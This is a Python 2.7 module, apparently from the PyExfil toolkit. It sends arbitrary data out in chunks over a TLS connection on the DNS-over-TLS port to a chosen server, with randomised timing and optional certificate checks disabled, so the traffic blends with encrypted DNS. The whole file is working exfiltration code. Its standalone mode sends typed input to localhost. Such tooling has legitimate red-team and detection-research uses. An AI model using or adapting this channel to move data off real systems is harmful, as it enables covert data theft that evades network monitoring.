#!/usr/bin/env python2.7

import sys
import ssl
import time
import socket
import random

from pyexfil.includes.prepare import _splitString

from pyexfil.comm.dns_over_tls.constants import (
    DNS_OVER_TLS_PORT,
    CHECK_CERT,
    CHUNK_SIZE,
)


def Send(data, server, port=DNS_OVER_TLS_PORT, certCheck=CHECK_CERT):

    if len(data) > CHUNK_SIZE:
        chunks = _splitString(stri=data, length=16)
    else:
        chunks = [data]

    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    if certCheck:
        context = context
    else:
        context.verify_mode = ssl.CERT_NONE

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        sock.settimeout(5)
        wrappedSocket = context.wrap_socket(sock)

    except Exception as e:
        sys.stderr.write("Something went wrong.\n")
        sys.stderr.writable(str(e))
        return False

    try:
        wrappedSocket.connect((server, port))
    except socket.error as se:
        sys.stderr.write(
            "Could not connect to %s:%s (probably comm error).\n" % (server, port)
        )
        sys.stderr.write(str(se))
        return False
    except Exception as e:
        sys.stderr.write(
            "Could not connect to %s:%s (probably cert error).\n" % (server, port)
        )
        sys.stderr.write(str(e))
        return False

    for i in chunks:
        """
        This is where the data is recvd. When you want to teach it to handle returns this is
        where you need to harvest it. Just create a call to a wrappedSocket.recv() to send incoming
        data wherever you want.
        * Just remember that the server automatically sends back random data. You should account
        for that on your end. (or you'll get an infinite loop and Hal will never open the bay door.)
        """
        wrappedSocket.send(i)
        time.sleep(random.random())
    wrappedSocket.close()
    return True


if __name__ == "__main__":
    sys.stdout.write("Running in SA mode. Every return key is a send.\n")
    while True:
        try:
            send_me = raw_input("[ ]\t")
            c = Send(send_me.strip(), server="127.0.0.1", port=DNS_OVER_TLS_PORT)
            if c:
                sys.stdout.write("{thank you, Dave}\n")
            else:
                sys.stderr.write("{i cannot open that door, Dave}\n")

        except KeyboardInterrupt:
            sys.stdout.write("Caught CTRL+C. Exiting now...\n")
            sys.exit()
